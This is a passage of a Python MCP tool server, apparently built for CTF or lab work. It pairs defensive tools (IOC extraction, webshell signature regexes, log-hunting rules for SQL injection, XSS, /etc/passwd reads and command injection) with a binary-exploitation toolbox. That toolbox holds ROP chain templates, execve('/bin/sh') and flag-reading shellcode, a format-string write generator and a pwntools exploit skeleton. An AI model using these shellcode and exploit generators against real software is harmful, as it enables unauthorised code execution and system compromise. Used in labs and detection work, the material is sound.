        "IPv4": r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b",
        "Domain": r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(?:com|net|org|io|co|gov|edu|mil|int|ru|cn|de|uk|fr|br|in|jp|au|ca|nl|se|no|fi|xyz|top|info|biz|me|tv|cc|tk|pw|gg|app|dev|sh|cloud|online|site|store|live|tech|digital|security)\b",
        "URL": r"https?://[^\s\"'<>\]]+",
        "Email": r"\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b",
        "MD5": r"\b[0-9a-fA-F]{32}\b",
        "SHA1": r"\b[0-9a-fA-F]{40}\b",
        "SHA256": r"\b[0-9a-fA-F]{64}\b",
        "SHA512": r"\b[0-9a-fA-F]{128}\b",
        "CVE": r"\bCVE-\d{4}-\d{4,7}\b",
        "Registry": r"HKEY_[A-Z_]+(?:\\[^\s\\\"']+)+",
    }

    for label, pat in patterns.items():
        found = sorted(set(re.findall(pat, text)))
        if found:
            results[label] = found

    if not results:
        return "[no IOCs detected]"

    lines = []
    for label, items in results.items():
        lines.append(f"=== {label} ({len(items)}) ===")
        lines.extend(f"  {x}" for x in items)
    return "\n".join(lines)


@mcp.tool()
def blue_entropy(path: str) -> str:
    """Calculate the Shannon entropy of a workspace file (0-8 bits/byte).

    High entropy (>7.2) strongly suggests encryption, compression, or Base64-heavy content.
    Values 4-6 are typical for text; values <3 suggest highly repetitive data.
    """
    import math

    target = _safe_path(path)
    data = target.read_bytes()
    if not data:
        return "0.0 bits/byte (empty file)"

    freq = [0] * 256
    for b in data:
        freq[b] += 1

    entropy = 0.0
    n = len(data)
    for f in freq:
        if f:
            p = f / n
            entropy -= p * math.log2(p)

    assessment = (
        "VERY HIGH — likely encrypted/compressed/packed (check for PE packer, AES blob, etc.)"
        if entropy > 7.2
        else "HIGH — Base64, compressed, or partially encrypted sections likely"
        if entropy > 6.5
        else "MEDIUM — mixed text and binary content"
        if entropy > 4.0
        else "LOW — typical plain text or structured data"
    )

    return (
        f"File:    {target.name}\n"
        f"Size:    {n} bytes\n"
        f"Entropy: {entropy:.4f} bits/byte\n"
        f"Rating:  {assessment}"
    )


@mcp.tool()
def blue_detect_webshell(path: str) -> str:
    """Scan a workspace file for webshell signatures and suspicious code patterns.

    Checks for: eval/exec of user input, base64-encoded payloads, cmd execution
    wrappers, obfuscation patterns, and common webshell fingerprints.
    """
    target = _safe_path(path)
    try:
        content = target.read_text(errors="replace")
    except Exception as e:
        return f"[cannot read file as text: {e}]"

    signatures = [
        # PHP
        (r"eval\s*\(\s*base64_decode", "PHP: eval(base64_decode(...))"),
        (r"eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", "PHP: eval($_REQUEST) — classic webshell"),
        (r"system\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", "PHP: system($_REQUEST)"),
        (r"passthru\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", "PHP: passthru($_REQUEST)"),
        (r"shell_exec\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", "PHP: shell_exec($_REQUEST)"),
        (r"preg_replace\s*\(.*\/e\b", "PHP: preg_replace /e modifier (code exec)"),
        (r"assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)", "PHP: assert($_REQUEST)"),
        (r"create_function\s*\(", "PHP: create_function (eval equivalent)"),
        (r"\$_(?:GET|POST|REQUEST|COOKIE)\s*\[.*\]\s*\(", "PHP: variable function call from user input"),
        # Python
        (r"exec\s*\(\s*(?:request|os)", "Python: exec(request/os)"),
        (r"__import__\s*\(\s*['\"]os['\"]", "Python: __import__('os')"),
        (r"subprocess\.(?:call|run|Popen)\s*\(.*shell\s*=\s*True", "Python: subprocess shell=True with possible injection"),
        # JSP/Java
        (r"Runtime\.getRuntime\(\)\.exec", "Java/JSP: Runtime.exec()"),
        (r"ProcessBuilder", "Java/JSP: ProcessBuilder"),
        # ASP
        (r"Server\.Execute|Response\.Write\s*\(.*Shell\b", "ASP: Server.Execute / Shell"),
        (r"WScript\.Shell|Shell\.Application", "ASP/VBS: WScript.Shell"),
        # Generic obfuscation
        (r"base64_decode\s*\(\s*str_replace", "Obfuscation: base64+str_replace chain"),
        (r"gzinflate\s*\(", "Obfuscation: gzinflate (compressed payload)"),
        (r"str_rot13\s*\(.*base64", "Obfuscation: rot13+base64 chain"),
        (r"chr\s*\(\s*\d+\s*\)\s*\.\s*chr", "Obfuscation: chr() concatenation"),
        (r"\\x[0-9a-f]{2}(?:\\x[0-9a-f]{2}){8,}", "Obfuscation: hex-encoded string"),
        # C99/r57 fingerprints
        (r"c99shell|r57shell|b374k|wso\s*shell|alfa\s*shell", "Known webshell fingerprint"),
    ]

    hits = []
    for line_no, line in enumerate(content.splitlines(), 1):
        for pattern, label in signatures:
            if re.search(pattern, line, re.IGNORECASE):
                hits.append(f"  Line {line_no:4d}: [{label}]\n          {line.strip()[:120]}")

    if not hits:
        return f"[no webshell signatures detected in {target.name}]"
    return f"=== Webshell signatures in {target.name} ({len(hits)} hit(s)) ===\n" + "\n".join(hits)


@mcp.tool()
def blue_log_hunt(path: str, pattern: str = "") -> str:
    """Hunt a workspace log file for suspicious activity.

    When `pattern` is empty, a built-in ruleset scans for: failed logins,
    SQL injection, XSS, LFI/RFI, command injection, scanner fingerprints,
    web shell access, and brute-force bursts.

    When `pattern` is given, it is treated as a Python regex and used instead.
    """
    target = _safe_path(path)
    try:
        lines = target.read_text(errors="replace").splitlines()
    except Exception as e:
        return f"[cannot read file: {e}]"

    if pattern:
        rules = [("custom", re.compile(pattern, re.IGNORECASE))]
    else:
        rules = [
            ("failed-auth",       re.compile(r"(fail|invalid|wrong|bad)\s+(pass|credential|login|user|auth)|authentication\s+failure|401|403", re.I)),
            ("sqli-attempt",      re.compile(r"(union\s+select|select\s+.*from|or\s+1=1|' or '|--\s|/\*.*\*/|drop\s+table|xp_cmdshell|information_schema)", re.I)),
            ("xss-attempt",       re.compile(r"(<script|onerror=|onload=|alert\(|javascript:|<iframe|<svg)", re.I)),
            ("lfi-rfi",           re.compile(r"(\.\./|%2e%2e%2f|file://|/etc/passwd|/etc/shadow|\.\.\\)", re.I)),
            ("cmd-injection",     re.compile(r"(;id|;whoami|\|\|id|\|whoami|`id`|%60id%60|\$\(id\)|\$\(whoami\)|system\(|exec\()", re.I)),
            ("scanner-ua",        re.compile(r"(sqlmap|nikto|nmap|masscan|zgrab|nuclei|dirbuster|gobuster|wfuzz|hydra|burpsuite|acunetix|nessus|openvas)", re.I)),
            ("webshell-access",   re.compile(r"(cmd=|shell=|exec=|c99|r57|b374k|wso\.php|shell\.php|webshell)", re.I)),
            ("susp-status",       re.compile(r'" (?:500|502|503) ')),
        ]

    hits: list[str] = []
    for no, line in enumerate(lines, 1):
        for label, rx in rules:
            if rx.search(line):
                hits.append(f"  {no:6d}  [{label}]  {line[:160]}")
                break  # one label per line

    summary = f"Scanned {len(lines)} lines, {len(hits)} suspicious line(s) found.\n"
    if not hits:
        return summary + "[clean]"
    return summary + "\n".join(hits[:500]) + (
        f"\n... [{len(hits)-500} more lines omitted]" if len(hits) > 500 else ""
    )


@mcp.tool()
def blue_file_hashes(path: str) -> str:
    """Compute MD5, SHA-1, SHA-256, and SHA-512 digests of a workspace file.

    Use these for: threat intelligence lookups (VirusTotal, MalwareBazaar),
    integrity verification, and comparing against known-bad hash lists.
    """
    target = _safe_path(path)
    data = target.read_bytes()
    return (
        f"File:    {target.name}\n"
        f"Size:    {len(data)} bytes\n"
        f"MD5:     {hashlib.md5(data).hexdigest()}\n"
        f"SHA-1:   {hashlib.sha1(data).hexdigest()}\n"
        f"SHA-256: {hashlib.sha256(data).hexdigest()}\n"
        f"SHA-512: {hashlib.sha512(data).hexdigest()}"
    )


@mcp.tool()
def blue_yara_scan(path: str, rules: str) -> str:
    """Scan a workspace file against YARA rules defined inline.

    `rules` should contain one or more complete YARA rule definitions, e.g.:
      rule SuspiciousString {
          strings: $a = "eval(" ascii
          condition: $a
      }
    The rules are written to a temp file then passed to the `yara` CLI.
    """
    target = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)
    rules_file = SCRATCH / "user_rules.yar"
    rules_file.write_text(rules)
    return _run(["yara", "-r", str(rules_file), str(target)])


@mcp.tool()
def blue_decode_layers(text: str, max_depth: int = 6) -> str:
    """Peel back encoding layers from obfuscated text (base64, URL-encoding, hex, rot13).

    Iteratively decodes until the result stabilises or max_depth layers are reached.
    Useful for deobfuscating payloads in logs, phishing emails, or malware scripts.
    """
    import urllib.parse as _ul

    layers = [f"Layer 0 (original): {text[:200]}"]
    current = text.strip()

    def _try_b64(s: str) -> str | None:
        s2 = re.sub(r"\s", "", s) + "=" * (-len(re.sub(r"\s", "", s)) % 4)
        try:
            decoded = base64.b64decode(s2)
            return decoded.decode("utf-8")
        except Exception:
            try:
                return base64.urlsafe_b64decode(s2).decode("utf-8")
            except Exception:
                return None

    def _try_url(s: str) -> str | None:
        decoded = _ul.unquote_plus(s)
        return decoded if decoded != s else None

    def _try_hex(s: str) -> str | None:
        c = re.sub(r"0x|\s|,", "", s)
        if re.fullmatch(r"[0-9a-fA-F]+", c) and len(c) >= 8 and len(c) % 2 == 0:
            try:
                return bytes.fromhex(c).decode("utf-8")
            except Exception:
                return None
        return None

    def _try_rot13(s: str) -> str | None:
        if not re.search(r"[a-zA-Z]", s):
            return None
        return codecs.encode(s, "rot_13")

    decoders = [
        ("base64", _try_b64),
        ("url-encoding", _try_url),
        ("hex", _try_hex),
        ("rot13", _try_rot13),
    ]

    for depth in range(1, max_depth + 1):
        changed = False
        for name, fn in decoders:
            result = fn(current)
            if result and result != current:
                current = result
                layers.append(f"Layer {depth} ({name}): {current[:400]}")
                changed = True
                break
        if not changed:
            break

    return "\n\n".join(layers)


# ---------------------------------------------------------------------------
# PWN TOOLBOX — Binary exploitation helpers
# ---------------------------------------------------------------------------

@mcp.tool()
def pwn_elf_info(path: str) -> str:
    """Full recon on a workspace ELF binary: file type, architecture, mitigations,
    imported functions, and section layout — everything you need before writing an exploit.

    Combines: file, checksec, readelf headers, dangerous imports, and PLT entries.
    """
    target = _safe_path(path)
    out = []

    # file magic
    out.append("=== file ===")
    out.append(_run(["file", str(target)]))

    # checksec via pwntools
    out.append("\n=== mitigations (checksec) ===")
    try:
        import logging
        from pwn import ELF, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        context.log_level = "error"
        elf = ELF(str(target), checksec=False)
        out.append(
            f"arch:      {elf.arch} ({elf.bits}-bit)\n"
            f"RELRO:     {elf.relro or 'No RELRO'}\n"
            f"Canary:    {elf.canary}\n"
            f"NX:        {elf.nx}\n"
            f"PIE:       {elf.pie}\n"
            f"RPATH:     {elf.rpath}\n"
            f"RUNPATH:   {elf.runpath}\n"
            f"Symbols:   {len(elf.symbols)} exported"
        )
    except Exception as e:
        out.append(f"[pwntools ELF failed: {e}]")

    # Section headers
    out.append("\n=== sections (readelf -S) ===")
    out.append(_truncate(_run(["readelf", "-S", "--wide", str(target)]), 60))

    # Dynamic imports — spot dangerous libc calls
    out.append("\n=== imported symbols ===")
    raw = _run(["readelf", "-W", "--syms", "--dyn-syms", str(target)])
    dangerous = {"gets", "strcpy", "strcat", "sprintf", "scanf", "system",
                 "popen", "exec", "execve", "execl", "execlp", "execvp",
                 "read", "recv", "memcpy", "memmove", "printf"}
    found_dangerous = []
    imported = []
    for line in raw.splitlines():
        if "UND" in line or "FUNC" in line:
            parts = line.split()
            if parts:
                name = parts[-1].split("@")[0]
                imported.append(name)
                if name in dangerous:
                    found_dangerous.append(name)
    out.append("All imports: " + ", ".join(sorted(set(imported))))
    if found_dangerous:
        out.append(f"\n⚠ Dangerous functions present: {', '.join(sorted(set(found_dangerous)))}")

    # PLT entries (useful for ret2plt / GOT overwrite)
    out.append("\n=== PLT entries ===")
    plt_out = _run(["objdump", "-d", "-j", ".plt", str(target)])
    out.append(_truncate(plt_out, 60))

    return "\n".join(out)


@mcp.tool()
def pwn_find_gadgets(path: str, filter_str: str = "", limit: int = 80) -> str:
    """Find ROP gadgets in a workspace binary using ROPgadget.

    filter_str: optional substring to filter gadget mnemonics (e.g. "pop rdi", "ret", "syscall").
    Returns gadget addresses and instructions sorted by address.
    Requires ROPgadget (pip install ROPgadget).
    """
    target = _safe_path(path)
    cmd = ["ROPgadget", "--binary", str(target), "--rop", "--nojop"]
    if filter_str:
        cmd += ["--filter", filter_str]
    out = _run(cmd)
    if "[tool not installed" in out:
        # fallback to objdump ret-sleds
        out = _run(["objdump", "-d", str(target)])
        gadgets = []
        for line in out.splitlines():
            if filter_str and filter_str.lower() not in line.lower():
                continue
            if re.search(r"ret|call|jmp|pop|push|syscall|int\s+0x80", line, re.I):
                gadgets.append(line.strip())
        return _truncate("\n".join(gadgets), limit)
    return _truncate(out, limit)


@mcp.tool()
def pwn_rop_chain(path: str, goal: str = "system_binsh") -> str:
    """Generate a ROP chain template for common exploit goals against a workspace binary.

    goal options:
      system_binsh   — call system("/bin/sh") via ret2libc
      execve_binsh   — raw execve("/bin/sh", NULL, NULL) syscall
      mprotect       — mprotect(addr, size, PROT_RWX) to make stack executable
      ret2plt_puts   — leak a GOT address via puts@plt for ASLR bypass
      one_gadget     — hint to use one_gadget tool for a single-gadget shell

    Returns an annotated pwntools Python scaffold you can fill in.
    """
    target = _safe_path(path)
    try:
        import logging
        from pwn import ELF, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        context.log_level = "error"
        elf = ELF(str(target), checksec=False)
        arch = elf.arch
        bits = elf.bits
        pie = elf.pie
        base_comment = "# PIE enabled — leak base address first" if pie else "# No PIE — addresses are static"
    except Exception:
        arch, bits, pie = "amd64", 64, False
        base_comment = "# (could not parse ELF — assuming amd64)"

    binary_var = f'ELF("./{target.name}")'

    templates = {
        "system_binsh": f"""\
# ret2libc — call system("/bin/sh")
# Prerequisites: libc base address (leak GOT entry first if ASLR/PIE)
from pwn import *

{base_comment}
elf  = {binary_var}
libc = ELF("./libc.so.6")           # drop the target libc in workspace
# p  = process(elf.path)
# p  = remote("host", port)

# Step 1: leak a libc address (e.g. via puts@plt leaking puts@got)
# Step 2: calculate libc base  →  libc.address = leaked - libc.sym["puts"]
# Step 3: build chain

pop_rdi  = next(elf.search(asm("pop rdi; ret", arch="{arch}")))   # ROPgadget
ret_gadget = pop_rdi + 1          # plain `ret` for stack alignment (x86-64)

chain = flat(
    ret_gadget,                    # align stack to 16 bytes (required by system())
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym["system"],
)
""",
        "execve_binsh": f"""\
# ret2syscall — execve("/bin/sh", NULL, NULL)  via raw syscall gadgets
# Works when NX is the only mitigation (no libc needed).
from pwn import *

{base_comment}
elf = {binary_var}
# p = process(elf.path)

# Gadgets needed (find with pwn_find_gadgets):
#   pop rax ; ret        (syscall number: 59 = execve on x86-64)
#   pop rdi ; ret        ("/bin/sh" address)
#   pop rsi ; ret        (NULL)
#   pop rdx ; ret        (NULL)
#   syscall

binsh_addr = next(elf.search(b"/bin/sh\\x00"))   # must exist in binary

chain = flat(
    pop_rax, 59,          # SYS_execve
    pop_rdi, binsh_addr,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall_ret,
)
""",
        "mprotect": f"""\
# mprotect gadget chain — make a memory region RWX so you can jump to shellcode
from pwn import *

{base_comment}
elf = {binary_var}
# p = process(elf.path)

# mprotect(addr, size, PROT_RWX=7)
# Gadgets needed: pop rdi, pop rsi, pop rdx, syscall  (or mprotect@plt)

stack_page = 0xdeadbeef & ~0xfff   # align to page boundary

chain = flat(
    pop_rdi, stack_page,
    pop_rsi, 0x1000,        # 1 page
    pop_rdx, 7,             # PROT_READ|WRITE|EXEC
    mprotect_plt_or_syscall,
    # jump to shellcode here
)
""",
        "ret2plt_puts": f"""\
# Leak GOT via puts@plt to defeat ASLR / compute libc base
from pwn import *

{base_comment}
elf = {binary_var}
# p = process(elf.path)

pop_rdi   = 0xdeadbeef       # from pwn_find_gadgets: "pop rdi ; ret"
ret_gadget = pop_rdi + 1     # plain ret for alignment

# --- Leak round ---
leak_chain = flat(
    pop_rdi,
    elf.got["puts"],          # address of puts@GOT to leak
    elf.plt["puts"],          # call puts to print it
    elf.sym["main"],          # return to main for second round
)

# parse 8-byte leak:
# leaked = u64(p.recvuntil(b"\\n", drop=True).ljust(8, b"\\x00"))
# libc.address = leaked - libc.sym["puts"]
""",
        "one_gadget": f"""\
# one_gadget — single gadget that calls execve("/bin/sh")
# Run:  one_gadget ./libc.so.6
# Pick a gadget whose constraints are satisfied at the call site.
#
# Typical usage after leaking libc base:
from pwn import *

libc = ELF("./libc.so.6")
# libc.address = leaked_puts - libc.sym["puts"]

one_gadget_offset = 0xdeadbeef   # replace with output of `one_gadget`
shell = libc.address + one_gadget_offset

# Overwrite return address / GOT entry with `shell`
""",
    }

    key = goal.lower()
    if key not in templates:
        return f"[unknown goal '{goal}'. Options: {', '.join(templates)}]"

    return (
        f"# ROP chain template — goal: {goal}\n"
        f"# Binary: {target.name}  arch={arch}  bits={bits}  PIE={pie}\n"
        f"# Fill in gadget addresses from pwn_find_gadgets / ROPgadget\n\n"
        + templates[key]
    )


@mcp.tool()
def pwn_shellcode(arch: str = "amd64", goal: str = "execve_binsh", format: str = "hex") -> str:
    """Generate shellcode for common exploit goals using pwntools asm().

    arch:   amd64 (default), x86, arm, aarch64, mips
    goal:   execve_binsh, read_flag (open+read+write /flag), exit_0
    format: hex (default), escaped (\\xNN), c_array, python_bytes

    Note: the container filesystem is read-only — shellcode is generated in-memory only.
    """
    try:
        import logging
        from pwn import asm, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)

        arch_map = {
            "amd64": ("amd64", "linux"), "x86": ("i386", "linux"),
            "x86_64": ("amd64", "linux"), "i386": ("i386", "linux"),
            "arm": ("arm", "linux"), "aarch64": ("aarch64", "linux"),
            "mips": ("mips", "linux"),
        }
        if arch.lower() not in arch_map:
            return f"[unsupported arch '{arch}'. Options: {', '.join(arch_map)}]"
        context.arch, context.os = arch_map[arch.lower()]
        context.log_level = "error"

        shellcodes = {
            "execve_binsh": {
                "amd64": """
                    xor  rdx, rdx
                    xor  rsi, rsi
                    lea  rdi, [rip+binsh]
                    mov  al,  59
                    syscall
                    binsh: .string "/bin/sh"
                """,
                "i386": """
                    xor  edx, edx
                    xor  ecx, ecx
                    push 0x68732f6e
                    push 0x69622f2f
                    mov  ebx, esp
                    xor  eax, eax
                    mov  al,  11
                    int  0x80
                """,
                "arm": """
                    mov  r7, #11
                    adr  r0, binsh
                    eor  r1, r1
                    eor  r2, r2
                    svc  #0
                    binsh: .ascii "/bin/sh\\0"
                """,
                "aarch64": """
                    mov  x8, #221
                    adr  x0, binsh
                    eor  x1, x1, x1
                    eor  x2, x2, x2
                    svc  #0
                    binsh: .string "/bin/sh"
                """,
            },
            "read_flag": {
                "amd64": """
                    /* open("/flag", O_RDONLY) */
                    xor  rax, rax
                    lea  rdi, [rip+flag_path]
                    xor  rsi, rsi
                    xor  rdx, rdx
                    mov  al,  2
                    syscall
                    /* read(fd, buf, 128) */
                    mov  rdi, rax
                    lea  rsi, [rip+buf]
                    mov  dl,  128
                    xor  rax, rax
                    syscall
                    /* write(1, buf, nread) */
                    mov  rdx, rax
                    mov  rdi, 1
                    mov  al,  1
                    syscall
                    /* exit(0) */
                    xor  rdi, rdi
                    mov  al,  60
                    syscall
                    flag_path: .string "/flag"
                    buf: .space 128
                """,
            },
            "exit_0": {
                "amd64": "xor rdi, rdi\nmov al, 60\nsyscall",
                "i386":  "xor ebx, ebx\nmov al, 1\nint 0x80",
                "arm":   "mov r7, #1\neor r0, r0\nsvc #0",
                "aarch64": "mov x8, #93\neor x0, x0, x0\nsvc #0",
            },
        }

        goal_map = shellcodes.get(goal.lower())
        if not goal_map:
            return f"[unknown goal '{goal}'. Options: {', '.join(shellcodes)}]"

        arch_key = context.arch
        src = goal_map.get(arch_key) or goal_map.get(list(goal_map)[0])
        raw = asm(src)

    except ImportError:
        return "[pwntools not installed]"
    except Exception as e:
        return f"[asm failed: {e}]"

    fmt = format.lower()
    if fmt == "hex":
        result = raw.hex()
    elif fmt == "escaped":
        result = "".join(f"\\x{b:02x}" for b in raw)
    elif fmt == "c_array":
        arr = ", ".join(f"0x{b:02x}" for b in raw)
        result = f"unsigned char sc[] = {{{arr}}}; // len={len(raw)}"
    elif fmt == "python_bytes":
        result = repr(raw)
    else:
        return f"[unknown format '{format}'. Options: hex, escaped, c_array, python_bytes]"

    return (
        f"arch={context.arch}  goal={goal}  len={len(raw)} bytes\n\n"
        f"{result}\n\n"
        f"# Bad bytes check (null): {'\\x00 PRESENT — may truncate!' if b'\\x00' in raw else 'no null bytes'}"
    )


@mcp.tool()
def pwn_bad_byte_check(shellcode_hex: str, bad_bytes_hex: str = "00 0a 0d") -> str:
    """Check shellcode for bad bytes that would corrupt the payload in transit.

    shellcode_hex:  shellcode as a hex string.
    bad_bytes_hex:  space-separated hex bytes to flag (default: 00 0a 0d = null, newline, CR).

    Returns a pass/fail report and highlights the offending offsets.
    """
    sc = bytes.fromhex(re.sub(r"\s", "", shellcode_hex))
    bad = [int(b, 16) for b in bad_bytes_hex.split()]
    hits = [(i, b) for i, b in enumerate(sc) if b in bad]

    if not hits:
        return f"✓ No bad bytes found in {len(sc)}-byte shellcode.\nBad bytes checked: {bad_bytes_hex}"

    lines = [f"✗ {len(hits)} bad byte(s) found in {len(sc)}-byte shellcode:"]
    for offset, val in hits:
        lines.append(f"  offset 0x{offset:04x} ({offset:4d}): 0x{val:02x}")
    lines.append(f"\nBad bytes checked: {bad_bytes_hex}")
    lines.append("\nFix ideas:")
    lines.append("  • Encode shellcode (shikata_ga_nai, alpha_mixed, xor-loop decoder)")
    lines.append("  • Use alternative opcodes (sub/add instead of xor rax,rax for zeroing)")
    lines.append("  • Swap instructions that produce bad bytes with equivalent sequences")
    return "\n".join(lines)


@mcp.tool()
def pwn_pattern_create(length: int = 200) -> str:
    """Generate a De Bruijn cyclic pattern for finding stack offsets after a crash.

    Feed this as input to the binary, get the crash value from rsp/rip/eip,
    then pass it to pwn_pattern_offset to find the exact overflow distance.
    """
    from pwn import cyclic
    pat = cyclic(length)
    return (
        f"Pattern ({length} bytes):\n{pat.decode('latin-1')}\n\n"
        f"hex: {pat.hex()}\n\n"
        f"Usage:\n"
        f"  python3 -c \"import sys; sys.stdout.buffer.write(b'{pat.hex()}')\" | ./binary\n"
        f"  OR:  python3 -c \"from pwn import *; io=process('./binary'); io.send(cyclic({length})); io.wait()\""
    )


@mcp.tool()
def pwn_pattern_offset(value: str, length: int = 200) -> str:
    """Find the offset of a crash value within the De Bruijn pattern.

    value: the value seen in rip/rsp/eip at crash time.
           Can be hex (0x6161616c), little-endian hex, or a 4/8-char ASCII fragment.
    """
    from pwn import cyclic_find, cyclic, p32, p64, u32, u64
    v = value.strip()
    attempts = []

    # try as hex integer → little-endian bytes
    if v.lower().startswith("0x"):
        raw_int = int(v, 16)
        for pack in (p32, p64):
            try:
                off = cyclic_find(pack(raw_int))
                if off != -1:
                    attempts.append(f"offset = {off}  (from {v} as little-endian {pack.__name__})")
            except Exception:
                pass

    # try as raw ASCII bytes
    try:
        off = cyclic_find(v.encode("latin-1")[:8])
        if off != -1:
            attempts.append(f"offset = {off}  (from ASCII bytes '{v}')")
    except Exception:
        pass

    if not attempts:
        return f"['{value}' not found in cyclic pattern of length {length}. Check the crash register carefully.]"
    return "\n".join(attempts)


@mcp.tool()
def pwn_got_plt(path: str) -> str:
    """List the GOT and PLT entries of a workspace ELF.

    Shows function names with their GOT addresses (for GOT overwrite / ret2plt attacks)
    and PLT stub addresses (for ret2plt leaks).
    """
    target = _safe_path(path)
    try:
        import logging
        from pwn import ELF, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        context.log_level = "error"
        elf = ELF(str(target), checksec=False)

        lines = [f"Binary: {target.name}  (base=0x{elf.address:x}, PIE={elf.pie})\n"]

        lines.append("=== GOT (Global Offset Table) ===")
        lines.append(f"{'Function':<30} {'GOT addr':>18}")
        lines.append("-" * 50)
        for name, addr in sorted(elf.got.items()):
            lines.append(f"{name:<30} {hex(addr):>18}")

        lines.append("\n=== PLT (Procedure Linkage Table) ===")
        lines.append(f"{'Function':<30} {'PLT stub':>18}")
        lines.append("-" * 50)
        for name, addr in sorted(elf.plt.items()):
            lines.append(f"{name:<30} {hex(addr):>18}")

        lines.append("\n=== Useful symbols ===")
        interesting = {"main", "win", "flag", "shell", "give_shell", "secret",
                       "system", "execve", "gets", "read", "puts", "printf"}
        for name, addr in sorted(elf.symbols.items()):
            if any(k in name.lower() for k in interesting):
                lines.append(f"  {name:<30} {hex(addr)}")

        return "\n".join(lines)
    except Exception as e:
        return f"[ELF parse failed: {e}]\nFallback readelf:\n" + _truncate(
            _run(["readelf", "-W", "--relocs", str(target)]), 80
        )


@mcp.tool()
def pwn_exploit_template(path: str, target_type: str = "process",
                          host: str = "localhost", port: int = 1337) -> str:
    """Generate a complete pwntools exploit script skeleton for a workspace binary.

    target_type: process (local), remote, gdb (local with GDB attached)
    Includes: ELF/libc loading, connection setup, send/recv helpers,
    cyclic pattern, and a commented exploit loop.
    """
    target = _safe_path(path)
    try:
        import logging
        from pwn import ELF, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        context.log_level = "error"
        elf = ELF(str(target), checksec=False)
        arch, bits, pie, canary, nx = elf.arch, elf.bits, elf.pie, elf.canary, elf.nx
    except Exception:
        arch, bits, pie, canary, nx = "amd64", 64, False, False, True

    conn = {
        "process": f'io = process(elf.path)',
        "remote":  f'io = remote("{host}", {port})',
        "gdb":     f'io = gdb.debug(elf.path, gdbscript="""\n    break main\n    continue\n""")',
    }.get(target_type.lower(), f'io = process(elf.path)')

    return f'''\
#!/usr/bin/env python3
# Exploit for: {target.name}
# arch={arch}  bits={bits}  PIE={pie}  Canary={canary}  NX={nx}
from pwn import *

# ── Target ───────────────────────────────────────────────────────────────────
context.binary = elf = ELF("./{target.name}", checksec=False)
context.arch   = "{arch}"
context.log_level = "info"

libc = ELF("./libc.so.6", checksec=False)    # drop libc in workspace if needed

def conn():
    {conn}
    return io

# ── Helpers ──────────────────────────────────────────────────────────────────
def sl(x):  io.sendline(x if isinstance(x, bytes) else x.encode())
def s(x):   io.send(x if isinstance(x, bytes) else x.encode())
def ru(x):  return io.recvuntil(x if isinstance(x, bytes) else x.encode())
def rl():   return io.recvline()
def sa(x,y): io.sendafter(x, y)

# ── Gadgets / offsets ────────────────────────────────────────────────────────
# Run pwn_find_gadgets("{target.name}") to populate these:
pop_rdi  = 0x0   # pop rdi ; ret
pop_rsi  = 0x0   # pop rsi ; ret
pop_rdx  = 0x0   # pop rdx ; ret
ret      = 0x0   # ret  (stack alignment)

# ── Exploit ──────────────────────────────────────────────────────────────────
io = conn()

# --- Step 1: find offset ---
# offset = {{"use pwn_pattern_offset after crashing with pwn_pattern_create"}}
OFFSET = 0

padding = b"A" * OFFSET

# --- Step 2: build payload ---
# Example: ret2libc after GOT leak
payload = flat(
    padding,
    # your chain here
)

{"# canary: leak it first — e.g. format-string read at canary offset" if canary else "# no stack canary"}
{"# PIE:    leak elf base before using elf.sym[] addresses" if pie else "# no PIE — addresses are static"}

sl(payload)

# ── Interact ─────────────────────────────────────────────────────────────────
io.interactive()
'''


@mcp.tool()
def pwn_format_string(offset: int, target_addr: int, value: int,
                      writes: int = 1, bits: int = 64) -> str:
    """Generate a format-string write payload (%n technique).

    offset:      the format-string argument offset where your input appears on the stack.
    target_addr: address to write to (e.g. GOT entry for system).
    value:       the value to write (e.g. address of win/system).
    writes:      1 = single 8-byte write (hhn chain), 2 = split into two 4-byte writes.
    bits:        address width (32 or 64).

    Returns the raw payload bytes as a hex string plus a pwntools fmtstr_payload call.
    """
    try:
        from pwn import fmtstr_payload, p32, p64, pack
        pack_fn = p64 if bits == 64 else p32

        # pwntools fmtstr_payload
        writes_dict = {target_addr: value}
        payload = fmtstr_payload(offset, writes_dict, write_size="byte")
        hex_payload = payload.hex()
        escaped = "".join(f"\\x{b:02x}" for b in payload)

        return (
            f"Format-string write: *0x{target_addr:x} = 0x{value:x}\n"
            f"Argument offset on stack: {offset}\n\n"
            f"=== pwntools fmtstr_payload ===\n"
            f"from pwn import fmtstr_payload\n"
            f"payload = fmtstr_payload({offset}, {{0x{target_addr:x}: 0x{value:x}}}, write_size='byte')\n\n"
            f"Payload ({len(payload)} bytes):\n"
            f"hex:     {hex_payload}\n"
            f"escaped: {escaped}\n\n"
            f"Tip: confirm the offset first with:\n"
            f"  AAAA.%p.%p.%p...  →  find 0x41414141 / 0x4141414141414141 at position N"
        )
    except Exception as e:
        return f"[fmtstr_payload failed: {e}]"


@mcp.tool()
def pwn_libc_search(libc_path: str, symbol: str = "system") -> str:
    """Look up a symbol offset inside a workspace libc, and list useful strings.

    Useful for: computing libc base from a leaked address, finding /bin/sh offset,
    one_gadget preparation, and confirming the libc version.
    """
    target = _safe_path(libc_path)
    try:
        import logging
        from pwn import ELF, context
        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        context.log_level = "error"
        libc = ELF(str(target), checksec=False)

        lines = [f"libc: {target.name}"]

        # Requested symbol
        if symbol in libc.sym:
            lines.append(f"\n{symbol}() offset: {hex(libc.sym[symbol])}")
        else:
            lines.append(f"\n[symbol '{symbol}' not found]")

        # Key offsets
        lines.append("\n=== Common symbol offsets ===")
        for s in ["system", "execve", "puts", "printf", "read", "write",
